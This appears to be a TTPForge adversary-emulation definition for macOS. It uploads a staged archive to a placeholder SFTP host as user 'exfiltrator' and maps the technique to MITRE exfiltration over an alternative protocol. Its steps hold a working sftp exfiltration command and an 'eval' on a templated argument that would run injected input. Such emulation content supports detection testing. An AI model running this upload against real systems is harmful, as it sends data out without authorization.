---
api_version: 2.0
uuid: a7b8c9d0-e1f2-4a3b-5c6d-7e8f90a1b2c3
name: Upload via SFTP
authors:
- TTPForge
description: |
  Exfiltrates data using SFTP protocol for secure file transfer
mitre:
  tactics:
  - TA0010 Exfiltration
  techniques:
  - T1048 Exfiltration Over Alternative Protocol
requirements:
  platforms:
  - os: darwin
args:
- name: file_path
  description: Local file path for upload
  type: string
  default: /tmp/.staging/data.tar.gz
- name: sftp_host
  description: SFTP server hostname
  type: string
  default: sftp.example.com
- name: sftp_user
  description: SFTP username
  type: string
  default: exfiltrator
- name: sftp_port
  description: SFTP server port
  type: string
  default: '22'
- name: remote_path
  description: Remote directory path
  type: string
  default: /uploads
- name: private_key
  description: Private key file path for authentication
  type: string
  default: ~/.ssh/id_rsa
steps:
- name: Verify file exists
  inline: test -f '{{ .Args.file_path }}' || (echo 'File not found'; exit 1)
- name: Check SSH key exists
  inline: |
    keypath=$(eval echo '{{ .Args.private_key }}')
    if [ -f "$keypath" ]; then
      echo "SSH key found at: $keypath"
      ls -lh "$keypath"
    else
      echo "WARNING: SSH key not found at $keypath"
    fi
- name: Prepare SFTP connection
  inline: |
    keypath=$(eval echo '{{ .Args.private_key }}')
    echo "SFTP Configuration:"
    echo "  Host: {{ .Args.sftp_host }}"
    echo "  Port: {{ .Args.sftp_port }}"
    echo "  User: {{ .Args.sftp_user }}"
    echo "  Remote path: {{ .Args.remote_path }}"
    echo "  File: $(basename '{{ .Args.file_path }}')"
- name: Execute SFTP upload
  inline: |
    keypath=$(eval echo '{{ .Args.private_key }}')
    echo "put '{{ .Args.file_path }}' '{{ .Args.remote_path }}/$(basename '{{ .Args.file_path }}')'" | \
      sftp -P '{{ .Args.sftp_port }}' -i "$keypath" '{{ .Args.sftp_user }}@{{ .Args.sftp_host }}' || \
      echo "SFTP upload failed"
  cleanup:
    inline: rm -f /tmp/test_sftp.dat
tests:
- name: dry_run_test
  dry_run: true
